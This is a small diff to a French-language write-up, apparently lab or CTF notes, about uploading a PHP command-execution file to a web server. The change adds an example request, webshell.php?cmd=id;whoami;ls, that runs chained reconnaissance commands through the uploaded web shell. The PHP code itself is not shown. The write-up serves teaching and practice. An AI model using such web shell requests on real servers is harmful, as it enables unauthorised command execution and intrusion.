@@ -26,4 +26,7 @@ On peut maintenant essayer d'upload un **executeur de commande**, pour ce faire 
 ?>
 ```
 
-Maintenant si nous nous rendons sur notre fichier, nous pouvons mettre notre commande dans l'url `?cmd=`
+Maintenant si nous nous rendons sur notre fichier, nous pouvons mettre notre commande dans l'url
+**`webshell.php?cmd=id;whoami;ls`**
+
+![[Pasted image 20230402141525.png]]
